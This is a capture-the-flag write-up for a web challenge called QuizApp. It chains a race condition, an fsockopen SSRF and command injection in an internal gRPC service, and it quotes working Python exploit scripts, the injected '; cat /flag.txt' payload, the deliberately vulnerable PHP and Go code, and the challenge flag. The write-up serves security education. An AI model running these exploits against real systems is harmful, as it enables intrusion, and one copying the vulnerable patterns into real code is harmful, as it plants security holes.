# QuizApp — CTF Writeup

**Category:** Web  
**Difficulty:** Hard  
**Points:** 150  
**Solves:** 36  
**Flag:** `VBD{grpc_with_g0ph3r_1s_b3st_8ce34e4dfe3390c372e49dbb61ad3242}`

---

## Challenge Description

> QuizApp is an interactive platform where users can test their knowledge through multiple-choice questions.

Target: `http://ctf.vulnbydefault.com:64225`

---

## Reconnaissance

### Nmap Scan

```
PORT      STATE SERVICE VERSION
64225/tcp open  http    Apache httpd 2.4.66 ((Debian))
```

### Directory Enumeration (ffuf)

```
auth.php      [200, Size: 0]
config.php    [200, Size: 0]
footer.php    [200, Size: 136]
header.php    [200, Size: 299]
index.php     [302 → login.php]
login.php     [200, Size: 1730]
register.php  [200, Size: 1731]
logout.php    [302]
profile.php   [302 → login.php]
submit.php    [200, Size: 24]
leaderboard.php
```

A standard PHP quiz application with authentication (register/login), quiz questions, a profile page with avatar uploads, and a leaderboard.

---

## Source Code Analysis

The challenge provided source code (`quizapp-web.zip`), revealing a multi-service architecture:

| Component | Technology | Port | Purpose |
|-----------|-----------|------|---------|
| Web App | PHP 8.2 / Apache | 80 | Quiz application |
| Database | MariaDB | 3306 | User data, questions |
| Monitor | Go / gRPC | 50051 | Health check service |

All three services run inside a single Docker container managed by supervisord.

### Vulnerability 1: Race Condition in `submit.php`

```php
session_write_close();  // ← Releases session lock!

$stmt = $pdo->prepare("SELECT COUNT(*) FROM solved_questions WHERE user_id = ? AND question_id = ?");
$stmt->execute([$user_id, $question_id]);
$solved = $stmt->fetchColumn();

if (!$solved) {
    usleep(200000);  // ← 200ms sleep widens the race window!
    
    $correct_answer = $_SESSION['correct_options'][$question_id] ?? '';
    if ($answer === $correct_answer) {
        $stmt = $pdo->prepare("UPDATE users SET score = score + 10 WHERE id = ?");
        $stmt->execute([$user_id]);
        
        $stmt = $pdo->prepare("INSERT INTO solved_questions (user_id, question_id) VALUES (?, ?)");
        $stmt->execute([$user_id, $question_id]);
    }
}
```

**Three critical flaws:**
1. `session_write_close()` releases the PHP session file lock, allowing concurrent requests to proceed simultaneously
2. `usleep(200000)` introduces a deliberate 200ms delay between the "is solved?" check and the point award — a massive TOCTOU (Time-of-Check-Time-of-Use) window
3. The `solved_questions` table has **no UNIQUE constraint** on `(user_id, question_id)`, so duplicate inserts succeed

**Impact:** Multiple concurrent requests all pass the "not solved" check, each awarding 10 points for the same question.

### Vulnerability 2: SSRF via `profile.php` Avatar URL

```php
if (!empty($_POST['avatar_url'])) {
    $url = $_POST['avatar_url'];
    $parsed = parse_url($url);
    $host = $parsed['host'] ?? '';
    $port = $parsed['port'] ?? 80;
    $path = $parsed['path'] ?? '/';
    
    $fp = @fsockopen($host, $port, $errno, $errstr, 10);
    if ($fp) {
        $data = urldecode(substr($path, 2));
        fwrite($fp, $data);  // ← Writes arbitrary data to arbitrary host:port!
        // ... reads response ...
    }
}
```

**This is a powerful SSRF primitive:**
- Connects to any `host:port` via raw TCP (`fsockopen`)
- Writes arbitrary binary data (URL-decoded from the path) to the socket
- Reads the response and saves it as a file
- Requires `score >= 100` to access (gated behind the race condition)

The `getimagesize()` check is bypassed for remote URLs:
```php
if ($check !== false || $is_remote) {  // $is_remote = true bypasses image check
```

### Vulnerability 3: OS Command Injection in gRPC Monitor (`monitor/main.go`)

```go
func (s *server) CheckHealth(ctx context.Context, in *pb.HealthRequest) (*pb.HealthResponse, error) {
    ip := in.GetIp()
    cmdStr := fmt.Sprintf("ping -c 1 %s", ip)  // ← No sanitization!
    out, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()  // ← Shell injection!
    // ...
}
```

The `ip` field is directly interpolated into a shell command. Injecting `; cat /flag.txt` results in:
```bash
sh -c "ping -c 1 ; cat /flag.txt"
```

---

## Exploitation

### Step 1: Race Condition to Unlock Avatar Upload (Score ≥ 100)

The quiz has 6 questions worth 10 points each (max 60 normally). We need 100 to unlock avatar uploads. The race condition lets us multiply our points.

**Strategy:** For each question, send 15+ concurrent requests with both answer options. The correct option's requests will all award 10 points each.

```python
import requests, threading, time

TARGET = "http://ctf.vulnbydefault.com:64225"
QUESTIONS = {
    1: ['11', '13'],
    2: ['Java', 'Python'],
    3: ['Mars', 'Jupiter'],
    4: ['8', '14'],
    5: ['Stack', 'Queue'],
    6: ['Gold', 'Silver'],
}
THREADS_PER_OPTION = 15

def submit_answer(qid, answer, session_cookie):
    s = requests.Session()
    s.cookies.set('PHPSESSID', session_cookie)
    resp = s.post(f"{TARGET}/submit.php", data={
        'question_id': qid,
        'answer': answer
    }, timeout=10)
    return resp.json()

def race_question(qid, options, session_cookie):
    threads = []
    for opt in options:
        for i in range(THREADS_PER_OPTION):
            t = threading.Thread(target=submit_answer, args=(qid, opt, session_cookie))
            threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=30)
```

**Result:** Scored **330 points** (33 correct race wins across 6 questions). Avatar upload unlocked.

### Step 2: SSRF to gRPC with Command Injection

The gRPC service on `127.0.0.1:50051` is not exposed externally. We reach it through the SSRF in `profile.php`.

**Crafting the payload:**

The SSRF connects via `fsockopen` and writes `urldecode(substr($path, 2))` — raw bytes extracted from the URL path. We need to construct a valid HTTP/2 + gRPC binary payload.

```python
import h2.connection, h2.config, struct, urllib.parse

def build_grpc_payload(cmd):
    config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    raw = conn.data_to_send()
    
    # gRPC HEADERS
    headers = [
        (':method', 'POST'),
        (':path', '/health.HealthCheck/CheckHealth'),
        (':scheme', 'http'),
        (':authority', '127.0.0.1:50051'),
        ('content-type', 'application/grpc'),
        ('te', 'trailers'),
    ]
    conn.send_headers(1, headers, end_stream=False)
    raw += conn.data_to_send()
    
    # Protobuf HealthRequest { ip = "<cmd>" }
    ip_bytes = cmd.encode('utf-8')
    protobuf_msg = b'\x0a' + bytes([len(ip_bytes)]) + ip_bytes
    
    # gRPC frame: compressed(1B) + length(4B) + message
    grpc_frame = b'\x00' + struct.pack('>I', len(protobuf_msg)) + protobuf_msg
    
    conn.send_data(1, grpc_frame, end_stream=True)
    raw += conn.data_to_send()
    return raw

payload = build_grpc_payload("; cat /flag.txt")
encoded = urllib.parse.quote(payload, safe='')
ssrf_url = f"http://127.0.0.1:50051//{encoded}"
```

**The SSRF URL breakdown:**
- `http://127.0.0.1:50051` — connects fsockopen to the internal gRPC service
- `//` prefix — first 2 chars stripped by `substr($path, 2)`
- URL-encoded HTTP/2 binary — decoded and written as raw bytes to the gRPC socket

**Sending the exploit:**
```python
s = requests.Session()
s.cookies.set('PHPSESSID', session_cookie)
resp = s.post(f"{TARGET}/profile.php", data={'avatar_url': ssrf_url})
```

The gRPC response (containing command output) is saved as an avatar file. Downloading it reveals:

```
ping: usage error: Destination address required
VBD{grpc_with_g0ph3r_1s_b3st_8ce34e4dfe3390c372e49dbb61ad3242}
```

---

## Attack Chain Summary

```
Register/Login
      ↓
Race Condition (submit.php)     →  Score: 0 → 330 points
      ↓
SSRF (profile.php avatar_url)   →  Raw TCP to 127.0.0.1:50051
      ↓
HTTP/2 gRPC Request             →  HealthCheck({ip: "; cat /flag.txt"})
      ↓
OS Command Injection (main.go)  →  sh -c "ping -c 1 ; cat /flag.txt"
      ↓
Flag in gRPC response           →  Saved as avatar file
```

---

## Key Takeaways

1. **Race conditions** are amplified by explicit sleep/delay calls and released locks (`session_write_close`)
2. **SSRF via raw sockets** (`fsockopen`) is a powerful primitive — it becomes a universal protocol proxy (HTTP, gRPC, MySQL, Redis, etc.)
3. **gRPC services** on internal ports are often overlooked in security reviews and may lack input validation
4. **Shell command construction** with `fmt.Sprintf` + `exec.Command("sh", "-c", ...)` is always dangerous without strict sanitization
5. The **h2 Python library** can craft raw HTTP/2 frames for protocol-level attacks against gRPC services

---

## Flag

```
VBD{grpc_with_g0ph3r_1s_b3st_8ce34e4dfe3390c372e49dbb61ad3242}
```
